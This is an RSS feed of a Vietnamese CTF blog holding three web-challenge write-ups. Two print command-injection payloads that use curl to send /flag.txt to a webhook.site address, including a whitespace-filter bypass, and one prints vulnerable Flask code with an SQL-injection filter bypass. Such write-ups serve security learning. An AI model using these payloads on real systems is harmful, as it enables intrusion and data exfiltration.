@@ -1,0 +1,190 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>CookieCTF - Category - g03m0n</title>
+        <link>https://g03m0n.github.io/categories/cookiectf/</link>
+        <description>CookieCTF - Category - g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/cookiectf/" rel="self" type="application/rss+xml" /><item>
+    <title>CookieCTF - The Existed File</title>
+    <link>https://g03m0n.github.io/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/</link>
+    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/arenas/mini-ctf-web-hacking/battle/the-existed-file" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge.</p>
+<p></p>
+<p>Thử nhập <code>/flag.txt</code> vẫn không có thay đổi gì. Ta thử nhập <code>cat /flag.txt</code> xem có xem được <code>flag</code> không nhưng lại hiện ra thông báo <code>Blacklist characters detected!</code>.</p>
+<p></p>
+<p>Kiểm tra <code>soucre code</code> có thể thấy luồng hoạt động của server.</p>
+<p></p>
+<p>Đoạn code này loại bỏ khoảng trắng của <code>input</code> người dùng nhập vào. Nó sử dụng phương thức <code>translate()</code> của lớp <code>string</code> để thay thế tất cả các ký tự khoảng trắng bằng giá trị <code>None</code>.
+Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>input</code> có nằm trong blacklist hay không.</p>
+<p>Có thể thấy <code>blacklist</code> đã loại bỏ hầu hết các câu lệnh giúp ta đọc được file <code>flag</code>, tuy nhiên anh dev có lẽ đã quên mất <code>filter</code> 1 cái nữa đó là <code>$(command)</code>. Câu lệnh này tương đương với sử dụng dấu <code>backstick</code>.</p>
+<p></p>
+<p>Quay lại challenge thử chạy luôn nhưng nó vẫn không xuất được nội dung</p>
+<p></p>
+<p>Tới đây ta để ý <code>blacklist</code> không lọc lệnh <code>curl</code> nên ta có thể gửi file <code>flag</code> qua host khác để đọc bằng option <code>-F</code>.
+Ở đây mình sử dụng <code>webhook.site</code> để làm host nhận file.</p>
+<p>Payload: <code>curl -F @/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p>Nhưng vẫn còn hàm <code>translate()</code> loại bỏ khoảng trắng của <code>input</code>. Search gg một lúc thì mình tìm được cái này:</p>
+<p></p>
+<p>Có thể sử dụng <code>${IFS}</code> để thay thế các ký tự <code>&lt;space&gt;</code> <code>&lt;tab&gt;</code> <code>&lt;newline&gt;</code>.</p>
+<p>Payload: <code>$(curl${IFS}-F${IFS}file=@/flag.txt${IFS}https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11)</code></p>
+<p></p>
+<p>Tải file <code>flag.txt</code>về ta được flag:
+<code>CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b1f4b3371b6a365f47334d3ec07a8d0e}</code></p>
+]]></description>
+</item>
+<item>
+    <title>CookieCTF - Baby Crawler</title>
+    <link>https://g03m0n.github.io/posts/cookiectf---baby-crawler/</link>
+    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf---baby-crawler/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-crawler" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Ở challenge này, khi ấn vào nút <code>CRAWL</code> trang web sẽ hiển thị một đường link <code>Cached File</code></p>
+<p></p>
+<p>Khi click vào đường link ta sẽ thấy <code>html</code> của trang web</p>
+<p></p>
+<p>Quay trở lại giao diện chính, kiểm tra source code thì phát hiện 1 endpoint <code>?debug</code></p>
+<p></p>
+<p>Kiểm tra thì thấy được đoạn code chạy ở server-side. Chú ý vào đoạn code này:</p>
+<p></p>
+<p>Đoạn code sẽ kiểm tra url người dung nhập vào có sử dụng HTTP/HTTPS hay không, nếu có website sẽ <code>crawl</code> web bằng lệnh <code>curl</code>, sau đó lưu nội dung <code>crawl</code> được vào một file nằm trong thư mục <code>./cache</code>.
+Vì có hàm <code>shell_exec</code> nên đây có thể là một lỗi Command Injection. Ở đây hàm <code>escapeshellcmd</code> được dùng để chặn các ký tự  <code>&amp;#;``|*?~&lt;&gt;^()[]{}$\</code>, <code>\x0A</code> và <code>\xFF</code> từ <code>url</code> người dùng nhập vào.</p>
+<p></p>
+<p>Vì vậy ta không thể bypass được challenge này theo hướng sử dụng các ký tự <code>;</code> hay <code>&amp;</code>, bắt buộc phải đi theo một hướng khác.
+Thay vì <code>inject</code> một câu lệnh để server thực hiện sau khi đã thực hiện lệnh <code>curl</code>, ta có thể tận dụng trực tiếp câu lệnh <code>curl</code> để gửi nội dung của file tới một server do ta tự dựng lên với option <code>-F</code>.</p>
+<p>Mình sẽ sử dụng <a href="https://webhook.site" target="_blank" rel="noopener noreffer">webhook.site</a>
+ để làm server nhận file gửi đến.</p>
+<p></p>
+<p>Payload:
+<code>http://18.142.90.137:31315/ -F file=@/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p></p>
+<p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
+]]></description>
+</item>
+<item>
+    <title>CookieCTF - Baby SQLite With Filter</title>
+    <link>https://g03m0n.github.io/posts/cookiectf---baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</link>
+    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf---baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-sqlite-with-filter" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>You cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = &lsquo;[&rsquo;, &lsquo;]&rsquo;, &lsquo;,&rsquo;, &lsquo;admin&rsquo;, &lsquo;select&rsquo;, &lsquo;&rsquo;&rsquo;, &lsquo;&quot;&rsquo;, &lsquo;\t&rsquo;, &lsquo;\n&rsquo;, &lsquo;\r&rsquo;, &lsquo;\x08&rsquo;, &lsquo;\x09&rsquo;, &lsquo;\x00&rsquo;, &lsquo;\x0b&rsquo;, &lsquo;\x0d&rsquo;, &rsquo; &lsquo;.
+<strong>The vulnerable parameter is &rsquo;level&rsquo; in Login function.</strong></p>
+</blockquote>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Tiến hành đọc source code:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
+import urllib
+import os
+import sqlite3
+
+app = Flask(__name__)
+app.secret_key = os.urandom(32)
+from flask import _app_ctx_stack
+
+DATABASE = &#39;users.db&#39;
+
+def get_db():
+    top = _app_ctx_stack.top
+    if not hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db = sqlite3.connect(DATABASE)
+    return top.sqlite_db
+
+
+FLAG = open(&#39;/flag.txt&#39;, &#39;r&#39;).read()
+
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template(&#39;index.jinja2&#39;)
+
+
+@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def login():
+    if request.method == &#39;GET&#39;:
+        return render_template(&#39;login.jinja2&#39;)
+
+    uid = request.form.get(&#39;uid&#39;, &#39;&#39;).lower()
+    upw = request.form.get(&#39;upw&#39;, &#39;&#39;).lower()
+    level = request.form.get(&#39;level&#39;, &#39;9&#39;).lower()
+
+    sqli_filter = [&#39;[&#39;, &#39;]&#39;, &#39;,&#39;, &#39;admin&#39;, &#39;select&#39;, &#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;, &#39;\x08&#39;, &#39;\x09&#39;, &#39;\x00&#39;, &#39;\x0b&#39;, &#39;\x0d&#39;, &#39; &#39;]
+    for x in sqli_filter:
+        if uid.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if upw.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if level.find(x) != -1:
+            return &#39;No Hack!&#39;
+
+   
+    with app.app_context():
+        conn = get_db()
+        query = f&#34;SELECT uid FROM users WHERE uid=&#39;{uid}&#39; and upw=&#39;{upw}&#39; and level={level};&#34;
+        try:
+            req = conn.execute(query)
+            result = req.fetchone()
+
+            if result is not None:
+                uid = result[0]
+                if uid == &#39;admin&#39;:
+                    return FLAG
+        except Exception as e:
+            print(e)
+            return &#39;Error!&#39;
+    return &#39;Good!&#39;
+
+
+@app.teardown_appcontext
+def close_connection(exception):
+    top = _app_ctx_stack.top
+    if hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db.close()
+
+
+if __name__ == &#39;__main__&#39;:
+    os.system(&#39;rm -rf %s&#39; % DATABASE)
+    with app.app_context():
+        conn = get_db()
+        conn.execute(&#39;CREATE TABLE users (uid text, upw text, level integer);&#39;)
+        conn.execute(&#34;INSERT INTO users VALUES (&#39;dream&#39;,&#39;cometrue&#39;, 9);&#34;)
+        conn.commit()
+
+    app.run(host=&#39;0.0.0.0&#39;, port=1337)
+</code></pre><p>Có thể thấy được rằng để lấy được flag thì <code>uid</code> phải là <code>admin</code> nhưng ở trong database lại không có user nào là <code>admin</code>.
+Vì vậy ta phải khiến cho chương trình hiện thị ra mỗi một cái bảng với cột uid = <code>admin</code>.</p>
+<p>Thử nghiệm ở trên <a href="https://sqliteonline.com/" target="_blank" rel="noopener noreffer">SQLite Online</a>
+ với câu lệnh như sau:</p>
+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw= &#39;cometrue&#39; AND level=&#39;9&#39; UNION SELECT &#39;admin&#39; AS uid;
+</code></pre><p></p>
+<p>Nhưng ta đã bị filter khá là nhiều ký tự, trong đó có cả <code>SELECT</code> và <code>admin</code>.</p>
+<p>Trong SQLite, theo <a href="http://www.humane-assessment.com/blog/moose-custom-analyses-made-easy/#:~:text=For%20example%2C%20to%20build%20a%20parser%20for%20SQLite%2C%20you%20can%20follow%20the%20official%20abstract%20grammar.%20In%20this%20grammar%2C%20the%20selectCore%20is%20one%20of%20the%20central%20productions%20and%20the%20specification%20looks%20like%3A" target="_blank" rel="noopener noreffer">selectCore</a>
+ ngoài kết hợp toán tử <code>UNION</code> với toán tử <code>SELECT</code> ta còn có thể kết hợp với toán tử <code>VALUES</code>.</p>
+<p></p>
+<p>Thử nghiệm:</p>
+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw=&#39;&#39; AND level=0 UNION VALUES(&#39;admin&#39;);
+</code></pre><p></p>
+<p>Và bypass ký tự <code>admin</code> bằng hàm <code>char()</code> có sẵn trong SQLite để ép kiểu về dạng ASCII, dùng <code>||</code> để nối chuỗi và dùng <code>/**/</code> để bypass khoảng trắng.
+Payload:</p>
+<pre tabindex="0"><code>uid=&amp;upw=&amp;level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
+</code></pre><p>Flag: <code>CHH{uS1nG_5yN7@x_d149raM_f95a6d70e2d13245852f2bc2a9ec023a}</code></p>
+]]></description>
+</item>
+</channel>
+</rss>
